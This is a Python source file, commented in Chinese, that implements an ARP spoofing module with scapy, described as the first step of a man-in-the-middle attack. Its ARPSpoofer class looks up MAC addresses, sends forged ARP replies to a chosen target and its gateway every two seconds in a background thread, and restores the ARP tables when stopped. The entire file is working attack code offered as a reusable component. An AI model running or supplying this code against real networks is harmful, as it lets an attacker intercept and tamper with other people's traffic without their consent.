#!/usr/bin/env python3
"""
ARP欺骗攻击模块
实现中间人攻击的第一步：ARP欺骗
"""

import time
import sys
from scapy.all import ARP, send, get_if_hwaddr, get_if_addr
import threading

class ARPSpoofer:
    def __init__(self, target_ip, gateway_ip, interface=None):
        """
        初始化ARP欺骗器
        
        Args:
            target_ip: 目标IP地址
            gateway_ip: 网关IP地址
            interface: 网络接口
        """
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.spoofing = False
        self.spoof_thread = None
        
        # 获取本机MAC地址
        if interface:
            self.attacker_mac = get_if_hwaddr(interface)
        else:
            self.attacker_mac = get_if_hwaddr()
    
    def get_mac(self, ip):
        """获取指定IP的MAC地址"""
        from scapy.all import Ether, srp
        
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        
        if answered_list:
            return answered_list[0][1].hwsrc
        return None
    
    def spoof(self, target_ip, spoof_ip):
        """发送ARP欺骗数据包"""
        target_mac = self.get_mac(target_ip)
        if target_mac:
            packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                        psrc=spoof_ip)
            send(packet, verbose=False, iface=self.interface)
    
    def restore(self, destination_ip, source_ip):
        """恢复ARP表"""
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        
        if destination_mac and source_mac:
            packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                        psrc=source_ip, hwsrc=source_mac)
            send(packet, count=4, verbose=False, iface=self.interface)
    
    def _spoof_loop(self):
        """ARP欺骗循环"""
        while self.spoofing:
            # 欺骗目标：告诉目标我们的MAC是网关的MAC
            self.spoof(self.target_ip, self.gateway_ip)
            # 欺骗网关：告诉网关我们的MAC是目标的MAC
            self.spoof(self.gateway_ip, self.target_ip)
            time.sleep(2)
    
    def start(self):
        """开始ARP欺骗"""
        if self.spoofing:
            return False
        
        self.spoofing = True
        self.spoof_thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self.spoof_thread.start()
        print(f"[+] ARP欺骗已启动: {self.target_ip} <-> {self.gateway_ip}")
        return True
    
    def stop(self):
        """停止ARP欺骗并恢复ARP表"""
        if not self.spoofing:
            return False
        
        self.spoofing = False
        if self.spoof_thread:
            self.spoof_thread.join(timeout=3)
        
        print("[+] 正在恢复ARP表...")
        self.restore(self.target_ip, self.gateway_ip)
        self.restore(self.gateway_ip, self.target_ip)
        print("[+] ARP表已恢复")
        return True


